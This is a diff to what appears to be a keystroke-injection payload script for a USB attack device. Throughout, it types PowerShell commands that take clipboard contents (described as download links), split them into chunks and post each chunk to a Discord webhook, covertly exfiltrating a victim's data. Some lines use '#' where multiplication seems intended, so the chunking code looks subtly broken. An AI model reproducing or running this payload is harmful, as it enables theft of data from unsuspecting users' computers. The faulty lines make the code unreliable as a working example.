@@ -34,55 +34,52 @@ QUACK DELAY 500
 QUACK CTRL c
 QUACK DELAY 500
 
-# Open a PowerShell and put all the links into $DOWNLOADS var
+# Open a PowerShell and put all the links into \$DOWNLOADS var
 QUACK GUI r
 QUACK DELAY 500
 QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 1000
-QUACK STRING $DOWNLOADS="
+QUACK STRING \$DOWNLOADS='
 QUACK CTRL v
 QUACK DELAY 500
 QUACK ENTER
 # It depends on the number of links
 QUACK DELAY 5000
-QUACK STRING "
+QUACK STRING '
 QUACK ENTER
 QUACK DELAY 500
 
 # Exfiltration using Discord Webhook
-QUACK STRING $WebhookUrl="$DISCORD_WEBHOOK"
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING $Payload = @{content = $DOWNLOADS} | ConvertTo-Json
+QUACK STRING \$Payload = @{content = \$DOWNLOADS} | ConvertTo-Json
 QUACK ENTER
 QUACK DELAY 500
 # This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
-QUACK STRING $len = $DOWNLOADS.Length
+QUACK STRING \$len = \$DOWNLOADS.Length
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $MAX_LEN = 1900
+QUACK STRING \$MAX_LEN = 1900
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)
+QUACK STRING \$ITERATIONS = [math]::Ceiling(\$len / \$MAX_LEN)
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING for ($i = 0; $i -lt $ITERATIONS; $i++) {
+QUACK STRING for (\$i = 0; \$i -lt \$ITERATIONS; \$i++) {
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $init = $i # $MAX_LEN
+QUACK STRING \$init = \$i # \$MAX_LEN
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $end = [math]::Min(($i + 1) # $MAX_LEN, $len)
+QUACK STRING \$end = [math]::Min((\$i + 1) # \$MAX_LEN, \$len)
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $sub = $DOWNLOADS.Substring($init, $end - $init)
+QUACK STRING \$sub = \$DOWNLOADS.Substring(\$init, \$end - \$init)
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $Payload = @{content = $sub} | ConvertTo-Json
+QUACK STRING \$Payload = @{content = \$sub} | ConvertTo-Json
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
+QUACK STRING Invoke-RestMethod -Uri '$DISCORD_WEBHOOK' -Method Post -Body \$Payload -ContentType 'application/json'
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING }; exit;
